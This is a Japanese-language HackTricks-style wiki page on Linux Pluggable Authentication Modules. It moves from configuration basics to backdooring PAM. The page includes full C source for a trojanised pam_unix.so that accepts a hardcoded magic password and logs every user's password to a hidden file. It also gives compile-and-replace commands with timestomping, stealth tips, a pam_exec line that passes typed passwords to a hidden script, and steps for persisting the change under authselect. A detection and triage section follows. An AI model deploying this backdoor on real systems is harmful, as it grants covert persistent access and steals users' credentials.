# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### 基本情報

**PAM (Pluggable Authentication Modules)** は、**コンピューターサービスへのアクセスを試みるユーザーの身元を確認する**セキュリティメカニズムとして機能し、さまざまな基準に基づいてアクセスを制御します。これはデジタルの門番に似ており、認証されたユーザーだけが特定のサービスを利用できるようにすると同時に、システムの過負荷を防ぐために利用を制限する場合もあります。

#### Configuration Files

- **Solaris and UNIX-based systems** では通常、`/etc/pam.conf` にある中央の設定ファイルを使用します。
- **Linux systems** ではディレクトリ方式が採用され、サービス固有の設定が `/etc/pam.d` 内に保存されます。たとえば、login service の設定ファイルは `/etc/pam.d/login` にあります。<sup>[[1]](#references)</sup>

login service の PAM configuration の例は、次のようになります:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

これらのrealm、つまりmanagement groupには、**auth**、**account**、**password**、**session**が含まれ、それぞれauthenticationおよびsession management processの異なる側面を担当します:<sup>[[1]](#references)</sup>

- **Auth**: 多くの場合、passwordの入力を要求してユーザーのidentityを検証します。
- **Account**: accountの検証を処理し、group membershipやtime-of-day restrictionsなどの条件を確認します。
- **Password**: complexity checksやdictionary attacks preventionなど、password updatesを管理します。
- **Session**: directoryのmountやresource limitsの設定など、service sessionの開始時または終了時の処理を管理します。

#### **PAM Module Controls**

Controlsはmoduleのsuccessまたはfailureに対するresponseを決定し、authentication process全体に影響を与えます。これには以下が含まれます:<sup>[[1]](#references)</sup>

- **Required**: required moduleがfailureになると、後続のすべてのmoduleがチェックされた後に最終的にfailureになります。
- **Requisite**: failure時にprocessを即座に終了します。
- **Sufficient**: successすると、後続のmoduleがfailureにならない限り、同じrealmの残りのchecksをバイパスします。
- **Optional**: stack内で唯一のmoduleである場合にのみfailureを引き起こします。

#### Offensive Semantics That Matter

PAMをbackdooringする際は、payload自体よりも**挿入するruleのlocation**のほうが重要になることがよくあります。

- `include`と`substack`は他のfileからruleを読み込むため、`sshd`を編集するとSSHにのみ影響する一方、`system-auth`、`common-auth`、またはその他のshared stackを編集すると複数のserviceに一度に影響します。
- PAMは`[success=1 default=ignore]`のようなbracketed controlsもサポートしています。これは、`pam_unix.so`を明確に置き換えるのではなく、custom checkがsuccessした後に1つ以上のmoduleを**skip**するために悪用できます。
- `module-path`には**absolute**（`/usr/lib/security/pam_custom.so`）またはdefault PAM module directoryからの**relative** pathを指定できます。modern Linux systemsでは、実際のdirectoryは`/lib/security`、`/lib64/security`、`/usr/lib/security`、または`/usr/lib/x86_64-linux-gnu/security`のようなmultiarch pathsであることがよくあります。

Quick operator takeaway: patchingする前に、必ず**full service graph**をmappingしてください。たとえば、一部のdistroでは`sshd -> password-auth -> system-auth`、別のdistroでは`sshd -> system-remote-login -> system-login -> system-auth`となるため、同じ1行のimplantでも意図した範囲よりはるかに広く拡散する可能性があります。

#### Example Scenario

複数のauth moduleがあるsetupでは、processは厳密な順序に従います。`pam_securetty` moduleがlogin terminalをunauthorizedと判断すると、root loginsはblockされますが、"required" statusであるため、すべてのmoduleのprocessingは継続されます。`pam_env`はenvironment variablesを設定し、user experienceの向上に役立つ可能性があります。`pam_ldap`と`pam_unix` moduleは協調してuserをauthenticateし、`pam_unix`は以前に提供されたpasswordの使用を試みることで、authentication methodsのefficiencyとflexibilityを高めます。


## Backdooring PAM – Hooking `pam_unix.so`

high-value Linux environmentsにおけるclassic persistence trickは、**legitimate PAM libraryをtrojanised drop-inとswapすること**です。すべてのSSH / console loginは最終的に`pam_unix.so:pam_sm_authenticate()`を呼び出すため、数行のCでcredentialsをcaptureしたり、*magic* password bypassを実装したりできます。<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

コンパイルしてステルス置換:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec のヒント
1. **Atomic overwrite** – 一時ファイルに書き込み、`mv` で配置して、SSH をロックアウトする可能性のある書き込み途中のライブラリを避ける。
2. `/usr/bin/.dbus.log` のようなログファイルの配置は、正規の desktop artefacts に紛れ込ませられる。
3. PAM の誤動作を避けるため、シンボルの export（`pam_sm_setcred` など）を同一に保つ。

### Detection
* `pam_unix.so` の MD5/SHA256 を distro package と比較する。
* `rpm -V pam` または `debsums -s libpam-modules` を使用すると、手動で hash を計算せずに置き換えられたライブラリを検出できる。
* `/lib/security/` 配下で、world-writable または通常とは異なる所有権を確認する。
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`。
* PAM configs で予期しない modules を grep する: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`。

### Quick triage commands (post-compromise または threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### persistence のための `pam_exec` の悪用
`pam_unix.so` を置き換える代わりに、`/etc/pam.d/sshd` に `pam_exec` の行を追加するという、より軽微な方法があります。これにより、通常の stack を維持したまま、SSH ログインのたびに implant を起動できます。
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` は、`PAM_USER`、`PAM_RHOST`、`PAM_SERVICE`、`PAM_TTY`、`PAM_TYPE` などの環境変数で PAM メタデータを受け取ります。`expose_authtok` を指定すると、helper は `auth` または `password` フェーズ中に `stdin` からパスワードを読み取ることもできます。real UID ではなく effective UID で helper を実行する場合は、`seteuid` を追加します。

実用上の注意:

- `session optional pam_exec.so ...` は、ソケットの再オープンや detached daemon の spawn などの **post-login actions** に適しています。
- `auth optional pam_exec.so quiet expose_authtok ...` は、セッションが開く前に実行されるため、**credential capture** で通常選択されます。
- `type=session` または `type=auth` を使用すると、特定の PAM フェーズに実行を限定し、不要な二重実行を回避できます。

### distro tooling による上書きへの対策: `authselect`

RHEL、CentOS Stream、Fedora、および派生システムでは、`/etc/pam.d/system-auth` や `/etc/pam.d/password-auth` などの生成ファイルを直接編集しても、**`authselect` によって上書きされる**可能性があります。永続化するには、通常 `/etc/authselect/custom/<profile>/` 配下のアクティブな custom profile に patch を適用し、その後に再選択または適用を行います。

root access がある場合の典型的な workflow:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
これは攻撃側とtriageの両方に関係します。`/etc/pam.d/system-auth` に `Generated by authselect` と `Do not modify this file manually` というバナーが含まれている場合、実際の永続化ポイントは `/etc/pam.d/` ではなく、`/etc/authselect/custom/` 配下に存在する可能性があります。

### 実環境で確認された最近のtradecraft

2025年に報告された **Plague** Linux backdoorでは、同じ基本的な発想がさらに進められていました。悪意のあるPAM componentに **static bypass password** が組み込まれ、さらにSSH関連の環境変数とshell history（`HISTFILE=/dev/null`）を削除して、login後のsession tracesを減らしていました。<sup>[[3]](#references)</sup> これは有用なhunting patternです。backdoorのlogicはPAM内に存在しながら、stealth artifactsはauthenticationが成功した**後**にのみ現れる可能性があるためです。


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
